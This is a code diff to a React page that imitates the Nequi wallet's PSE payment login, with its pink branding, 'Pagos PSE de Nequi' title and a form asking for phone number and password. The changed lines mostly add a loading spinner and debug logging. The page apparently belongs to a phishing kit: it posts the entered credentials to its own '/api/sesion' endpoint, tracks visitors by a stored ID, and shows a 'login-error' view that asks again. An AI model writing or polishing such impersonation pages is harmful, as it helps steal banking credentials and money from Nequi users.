@@ -16,6 +16,14 @@ function esCelularColombianoValido(numero) {
   return /^3\d{9}$/.test(String(numero));
 }
 
+const Loading = () => {
+  return (
+    <div className="fixed inset-0 bg-white/60 flex items-center justify-center z-50">
+      <div className="w-12 h-12 border-4 border-[#da0081] border-t-transparent rounded-full animate-spin" />
+    </div>
+  );
+};
+
 
 const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar, tituloError }) => {
     const [errorDatos, setErrorDatos] = useState({
@@ -97,7 +105,7 @@ const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar,
                     <button onClick={handlerContinuar} disabled={datosInicio.numeroDocumento.trim() == "" || datosInicio.contrasenia.trim() == ""} className={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`}>
                         Entra
                     </button>
-                    <button onClick={btnCancelar} className={`ml-3 mt-2 py-4 ${text_color} border-1 w-full rounded-sm `}>
+                    <button onClick={btnCancelar} className={`mt-2 py-4 ${text_color} border-1 w-full rounded-sm `}>
                         Ahora no
                     </button>
                 </div>
@@ -138,10 +146,12 @@ export default function Nequi (){
     
     //obtener uniqId
     useEffect(() => {
+        setLoading(true)
         const savedId = localStorage.getItem('uniqId')
         console.log(savedId == null, "guardaaaa", savedId);
         const temp = savedId == null ? "" : savedId
         setUniqId(temp)
+        setLoading(false)
         
     }, [])
     
@@ -149,6 +159,8 @@ export default function Nequi (){
     useEffect(()=>{
         const inicioSesionfuncion = async ()=>{
             setLoading(true)
+            console.log(loading);
+            
             const { data } = await axios.post(
             `/api/sesion`,
             {
@@ -383,7 +395,8 @@ export default function Nequi (){
                 </svg>
                 <p className={`text-[20px] mt-3 font-semibold pb-5 text-[${text_color}]`}>Pagos PSE de Nequi</p>
                 <p className={`text-[15px] pb-5 text-[${text_color}] text-center mt-2.5`}>Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.</p>
-                
+                {loading && <Loading/>}
+                {reLoad && <Loading/>}
                 {!inicioSesion && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerBtnInicio}/>}
                 {selectVista == "login-error" && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerloginError}/>}
                 
